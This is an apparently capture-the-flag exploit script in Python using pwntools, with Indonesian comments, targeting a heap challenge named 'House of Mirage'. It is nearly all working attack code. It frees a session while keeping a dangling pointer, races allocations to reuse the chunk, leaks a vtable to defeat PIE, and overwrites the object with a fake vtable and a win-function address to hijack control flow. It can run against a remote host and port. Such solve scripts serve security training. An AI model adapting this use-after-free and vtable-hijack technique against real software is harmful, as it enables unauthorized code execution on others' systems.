#!/usr/bin/env python3

from pathlib import Path
import argparse
import re
import sys
import time

from pwn import ELF, context, p64, process, remote


BASE = Path(__file__).resolve().parent
BIN = BASE / "house_of_mirage"
LD = BASE / "ld-linux-x86-64.so.2"

context.binary = ELF(str(BIN), checksec=False)
context.log_level = "info"


VTABLE_OFFSET = 0x6030
FAKE_VTABLE_OFFSET = 0x5C60
WIN_OFFSET = 0x3970

POISON = 0xA5A5A5A5A5A5A5A5

FLAG_RE = re.compile(rb"grodno\{[^\r\n}]+\}")
MENU_PROMPT = b"> "


def start(host=None, port=None):
    if host is not None:
        return remote(host, port, timeout=5)

    return process(
        [
            str(LD),
            "--library-path",
            str(BASE),
            str(BIN),
        ],
        cwd=str(BASE),
    )


def sync_menu(io):
    io.recvuntil(MENU_PROMPT)


def create_session(
    io,
    owner=b"mirage",
    tagline=b"reflection",
) -> int:
    io.sendline(b"1")
    io.sendlineafter(b"owner: ", owner)
    io.sendlineafter(b"tagline: ", tagline)

    output = io.recvuntil(MENU_PROMPT)

    match = re.search(
        rb"session id: (\d+)",
        output,
    )

    if not match:
        raise RuntimeError(
            f"gagal membuat session: {output!r}"
        )

    return int(match.group(1))


def arm_expiry(
    io,
    session_id: int,
    seconds: int,
):
    io.sendline(b"5")

    io.sendlineafter(
        b"id: ",
        str(session_id).encode(),
    )

    io.sendlineafter(
        b"seconds until archive sweep: ",
        str(seconds).encode(),
    )

    output = io.recvuntil(MENU_PROMPT)

    if b"session scheduled" not in output:
        raise RuntimeError(
            f"gagal mengatur expiry: {output!r}"
        )


def spray_sink_race(
    io,
    session_id: int,
    count: int = 8,
    seconds: int = 3600,
):
    batch = bytearray()

    for index in range(count):
        batch += b"6\n"
        batch += f"race-{index}\n".encode()

        batch += b"5\n"
        batch += f"{session_id}\n".encode()
        batch += f"{seconds}\n".encode()

    # Semua command dikirim sekaligus.
    # Sink allocation dan expiry update diproses dari buffer
    # yang sama, jadi tidak terkena network round-trip.
    io.send(bytes(batch))

    output = bytearray()

    for _ in range(count):
        output += io.recvuntil(
            b"session scheduled\n"
        )

    output += io.recvuntil(MENU_PROMPT)

    sink_ids = [
        int(value)
        for value in re.findall(
            rb"sink id: (\d+)",
            bytes(output),
        )
    ]

    if not sink_ids:
        raise RuntimeError(
            f"tidak ada sink yang berhasil dibuat: "
            f"{bytes(output)!r}"
        )

    return sink_ids


def show_session(
    io,
    session_id: int,
) -> bytes:
    io.sendline(b"2")

    io.sendlineafter(
        b"id: ",
        str(session_id).encode(),
    )

    return io.recvuntil(MENU_PROMPT)


def parse_serial(output: bytes) -> int:
    match = re.search(
        rb"serial: 0x([0-9a-fA-F]+)",
        output,
    )

    if not match:
        raise RuntimeError(
            f"serial leak tidak ditemukan: {output!r}"
        )

    return int(match.group(1), 16)


def mirror_import(
    io,
    session_id: int,
    payload: bytes,
):
    io.sendline(b"3")

    io.sendlineafter(
        b"id: ",
        str(session_id).encode(),
    )

    io.sendlineafter(
        b"blob length: ",
        str(len(payload)).encode(),
    )

    io.sendafter(
        b"blob bytes: ",
        payload,
    )

    output = io.recvuntil(MENU_PROMPT)

    if b"profile imported" not in output:
        raise RuntimeError(
            f"mirror import gagal: {output!r}"
        )


def flush_sink(
    io,
    sink_id: int,
    message=b"reflect",
) -> bytes:
    io.sendline(b"8")

    io.sendlineafter(
        b"id: ",
        str(sink_id).encode(),
    )

    io.sendlineafter(
        b"message: ",
        message,
    )

    return io.recvall(timeout=4)


def exploit(io) -> bytes:
    sync_menu(io)

    session_id = create_session(io)

    # Jadikan session expired.
    arm_expiry(
        io,
        session_id,
        0,
    )

    # Tunggu sweeper mengembalikan chunk ke pool.
    # Pointer sessions[session_id] tidak dikosongkan.
    time.sleep(0.10)

    # Reuse chunk session sebagai sink dan langsung pin
    # timestamp-nya melalui dangling session pointer.
    sink_ids = spray_sink_race(
        io,
        session_id,
    )

    stale_session = show_session(
        io,
        session_id,
    )

    vtable = parse_serial(
        stale_session,
    )

    if vtable == POISON:
        raise RuntimeError(
            "race miss: chunk masih berisi poison 0xa5"
        )

    if (
        vtable & 0xFFF
    ) != (
        VTABLE_OFFSET & 0xFFF
    ):
        raise RuntimeError(
            f"leak bukan sink vtable: {vtable:#x}"
        )

    pie_base = (
        vtable
        - VTABLE_OFFSET
    )

    if (
        pie_base <= 0
        or pie_base & 0xFFF
    ):
        raise RuntimeError(
            f"PIE base tidak valid: {pie_base:#x}"
        )

    fake_vtable = (
        pie_base
        + FAKE_VTABLE_OFFSET
    )

    win = (
        pie_base
        + WIN_OFFSET
    )

    print(
        f"[+] vtable leak : {vtable:#x}"
    )

    print(
        f"[+] PIE base    : {pie_base:#x}"
    )

    print(
        f"[+] fake vtable : {fake_vtable:#x}"
    )

    print(
        f"[+] win         : {win:#x}"
    )

    print(
        f"[+] sink aliases: {sink_ids}"
    )

    # PIE+0x5c60 berisi pointer PIE+0x3a10.
    #
    # PIE+0x3a10:
    #     jmp qword ptr [rdi+8]
    #
    # Saat flush:
    #     rdi = sink
    #
    # Jadi:
    #     sink+0x00 = PIE+0x5c60
    #     sink+0x08 = win
    #
    # call [sink->vtable]
    # -> PIE+0x3a10
    # -> jmp [sink+8]
    # -> win
    payload = (
        p64(fake_vtable)
        + p64(win)
    )

    mirror_import(
        io,
        session_id,
        payload,
    )

    # Sink 0 tetap menunjuk reused chunk.
    # Jika race awal gagal, sink berikutnya akan reuse
    # alamat yang sama sehingga sink 0 menjadi alias.
    return flush_sink(
        io,
        sink_ids[0],
    )


def main():
    parser = argparse.ArgumentParser(
        description="House of Mirage exploit"
    )

    parser.add_argument(
        "host",
        nargs="?",
    )

    parser.add_argument(
        "port",
        nargs="?",
        type=int,
    )

    parser.add_argument(
        "--attempts",
        type=int,
        default=30,
    )

    parser.add_argument(
        "--debug",
        action="store_true",
    )

    args = parser.parse_args()

    if (
        args.host is None
    ) != (
        args.port is None
    ):
        parser.error(
            "pakai: python3 solve.py HOST PORT"
        )

    if args.attempts < 1:
        parser.error(
            "--attempts minimal 1"
        )

    if args.debug:
        context.log_level = "debug"

    remote_mode = (
        args.host is not None
    )

    last_error = None

    for attempt in range(
        1,
        args.attempts + 1,
    ):
        io = None

        try:
            print(
                f"[*] attempt "
                f"{attempt}/{args.attempts}"
            )

            io = start(
                args.host,
                args.port,
            )

            result = exploit(io)

            sys.stdout.buffer.write(
                result
            )

            sys.stdout.buffer.flush()

            match = FLAG_RE.search(
                result
            )

            if match:
                flag = (
                    match.group(0)
                    .decode()
                )

                print(
                    f"\n<FLAG>{flag}</FLAG>"
                )

                return 0

            raise RuntimeError(
                "fungsi win belum menghasilkan flag"
            )

        except (
            EOFError,
            TimeoutError,
            ValueError,
            RuntimeError,
            OSError,
        ) as error:
            last_error = error

            print(
                f"[-] attempt gagal: {error}"
            )

        finally:
            if io is not None:
                try:
                    io.close()
                except Exception:
                    pass

        if not remote_mode:
            break

        time.sleep(0.05)

    print(
        f"[-] exploit gagal: {last_error}",
        file=sys.stderr,
    )

    return 1


if __name__ == "__main__":
    raise SystemExit(main())
